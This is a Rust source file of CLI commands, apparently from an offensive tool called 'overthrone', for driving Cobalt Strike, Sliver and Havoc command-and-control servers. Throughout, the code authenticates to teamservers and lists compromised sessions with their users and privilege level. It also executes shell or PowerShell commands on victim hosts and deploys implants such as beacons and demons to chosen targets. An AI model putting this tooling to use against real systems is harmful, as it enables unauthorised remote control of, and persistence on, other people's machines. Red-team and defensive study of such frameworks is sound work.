//! CLI commands for C2 framework integration

use std::collections::HashMap;
use std::time::Duration;
use colored::Colorize;
use overthrone_core::c2::{
    C2Manager, C2Config, C2Framework, C2Auth,
    cobalt_strike::CobaltStrikeChannel,
    sliver::SliverChannel,
    havoc::HavocChannel,
};

/// Connect to a C2 teamserver
pub async fn cmd_c2_connect(
    manager: &mut C2Manager,
    framework: &str,
    host: &str,
    port: u16,
    auth_args: &HashMap<String, String>,
) -> overthrone_core::error::Result<()> {
    let (fw, channel): (C2Framework, Box<dyn overthrone_core::c2::C2Channel>) = match framework.to_lowercase().as_str() {
        "cs" | "cobaltstrike" | "cobalt-strike" => {
            (C2Framework::CobaltStrike, Box::new(CobaltStrikeChannel::new()))
        }
        "sliver" => {
            (C2Framework::Sliver, Box::new(SliverChannel::new()))
        }
        "havoc" => {
            (C2Framework::Havoc, Box::new(HavocChannel::new()))
        }
        other => {
            return Err(overthrone_core::error::OverthroneError::C2(format!(
                "Unknown C2 framework: '{}'. Supported: cs, sliver, havoc", other
            )));
        }
    };

    // Build auth from provided args
    let auth = if let Some(config_path) = auth_args.get("config") {
        C2Auth::SliverConfig { config_path: config_path.clone() }
    } else if let Some(token) = auth_args.get("token") {
        C2Auth::Token { token: token.clone() }
    } else if let Some(password) = auth_args.get("password") {
        C2Auth::Password { password: password.clone() }
    } else if let (Some(cert), Some(key), Some(ca)) = (
        auth_args.get("cert"),
        auth_args.get("key"),
        auth_args.get("ca"),
    ) {
        C2Auth::MtlsCert {
            cert_path: cert.clone(),
            key_path: key.clone(),
            ca_path: ca.clone(),
        }
    } else {
        return Err(overthrone_core::error::OverthroneError::C2(
            "No authentication provided. Use --password, --token, --config, or --cert/--key/--ca".to_string()
        ));
    };

    let config = C2Config {
        framework: fw.clone(),
        host: host.to_string(),
        port,
        auth,
        tls: auth_args.get("tls").map_or(true, |v| v != "false"),
        tls_skip_verify: auth_args.get("skip-verify").map_or(false, |v| v == "true"),
        timeout: Duration::from_secs(
            auth_args.get("timeout").and_then(|v| v.parse().ok()).unwrap_or(30)
        ),
        auto_reconnect: true,
    };

    let channel_name = auth_args.get("name")
        .cloned()
        .unwrap_or_else(|| format!("{}", fw));

    println!(
        "{} Connecting to {} at {}:{}...",
        "⚡".yellow(), fw.to_string().cyan().bold(), host, port
    );

    manager.add_channel(&channel_name, channel);
    manager.connect(&channel_name, &config).await?;

    println!(
        "{} Connected to {} as '{}'",
        "✓".green().bold(), fw, channel_name.white().bold()
    );

    Ok(())
}

/// List all C2 connections and sessions
pub async fn cmd_c2_status(manager: &C2Manager) -> overthrone_core::error::Result<()> {
    let channels = manager.status();

    if channels.is_empty() {
        println!("{}", "No C2 channels configured.".yellow());
        println!("  Use 'c2 connect <framework> <host> <port> --password <pass>' to connect");
        return Ok(());
    }

    println!("{}", "C2 Channels:".cyan().bold());
    println!(
        "  {:<15} {:<18} {}",
        "Name", "Framework", "Status"
    );
    println!("  {}", "─".repeat(50));

    for (name, framework, connected) in &channels {
        let status = if *connected {
            "● Connected".green()
        } else {
            "○ Disconnected".red()
        };
        println!("  {:<15} {:<18} {}", name.white().bold(), framework.to_string(), status);
    }

    // List sessions from all connected channels
    println!();
    println!("{}", "Active Sessions:".cyan().bold());
    println!(
        "  {:<12} {:<15} {:<16} {:<20} {:<6} {:<8} {}",
        "ID", "Hostname", "IP", "User", "PID", "Arch", "Type"
    );
    println!("  {}", "─".repeat(95));

    let mut total_sessions = 0;

    for (name, _, connected) in &channels {
        if !*connected { continue; }

        if let Some(channel) = manager.get_channel(name) {
            match channel.list_sessions().await {
                Ok(sessions) => {
                    for session in &sessions {
                        let elevated_marker = if session.elevated { "★ " } else { "  " };
                        let type_color = match session.session_type {
                            overthrone_core::c2::SessionType::Beacon => "beacon".yellow(),
                            overthrone_core::c2::SessionType::Session => "session".green(),
                            overthrone_core::c2::SessionType::SliverBeacon => "s-beacon".blue(),
                            overthrone_core::c2::SessionType::Demon => "demon".red(),
                            overthrone_core::c2::SessionType::Interactive => "interactive".cyan(),
                        };

                        println!(
                            "  {:<12} {:<15} {:<16} {}{:<18} {:<6} {:<8} {}",
                            session.id.chars().take(10).collect::<String>().white(),
                            session.hostname,
                            session.ip,
                            elevated_marker,
                            session.username,
                            session.pid,
                            session.arch,
                            type_color,
                        );
                        total_sessions += 1;
                    }
                }
                Err(e) => {
                    println!("  {} Error listing sessions for '{}': {}", "✗".red(), name, e);
                }
            }
        }
    }

    if total_sessions == 0 {
        println!("  {}", "No active sessions.".dimmed());
    } else {
        println!();
        println!("  Total: {} session(s)", total_sessions.to_string().cyan().bold());
    }

    Ok(())
}

/// Execute a command on a C2 session
pub async fn cmd_c2_exec(
    manager: &C2Manager,
    session_id: &str,
    command: &str,
    powershell: bool,
) -> overthrone_core::error::Result<()> {
    // Find which channel owns this session
    for (name, _, connected) in manager.status() {
        if !connected { continue; }

        if let Some(channel) = manager.get_channel(name) {
            if let Ok(session) = channel.get_session(session_id).await {
                println!(
                    "{} Executing on {} ({}) via {}...",
                    "⚡".yellow(),
                    session.hostname.white().bold(),
                    session_id,
                    name.cyan()
                );

                let result = if powershell {
                    channel.exec_powershell(session_id, command).await?
                } else {
                    channel.exec_command(session_id, command).await?
                };

                if result.success {
                    println!("{} Task {} completed in {:?}", "✓".green().bold(), result.task_id, result.duration);
                    if !result.output.is_empty() {
                        println!("{}", result.output);
                    }
                } else {
                    println!("{} Task failed: {}", "✗".red().bold(), result.error);
                }

                return Ok(());
            }
        }
    }

    Err(overthrone_core::error::OverthroneError::C2(format!(
        "Session '{}' not found in any connected C2", session_id
    )))
}

/// Deploy an implant to a target via C2
pub async fn cmd_c2_deploy(
    manager: &C2Manager,
    channel_name: &str,
    target: &str,
    listener: &str,
) -> overthrone_core::error::Result<()> {
    let channel = manager.get_channel(channel_name)
        .ok_or_else(|| overthrone_core::error::OverthroneError::C2(format!(
            "Channel '{}' not found", channel_name
        )))?;

    println!(
        "{} Deploying implant to {} via {} (listener: {})...",
        "⚡".yellow(), target.white().bold(), channel_name.cyan(), listener
    );

    let request = overthrone_core::c2::ImplantRequest {
        target: target.to_string(),
        implant_type: match channel.framework() {
            C2Framework::CobaltStrike => overthrone_core::c2::ImplantType::CsBeacon,
            C2Framework::Sliver => overthrone_core::c2::ImplantType::SliverImplant,
            C2Framework::Havoc => overthrone_core::c2::ImplantType::HavocDemon,
            _ => overthrone_core::c2::ImplantType::Shellcode,
        },
        listener: listener.to_string(),
        delivery_method: overthrone_core::c2::DeliveryMethod::OverthroneExec,
        arch: "x64".to_string(),
        staged: false,
    };

    let result = channel.deploy_implant(&request).await?;

    if result.success {
        println!("{} Implant deployment initiated: {}", "✓".green().bold(), result.output);
    } else {
        println!("{} Deployment failed: {}", "✗".red().bold(), result.error);
    }

    Ok(())
}
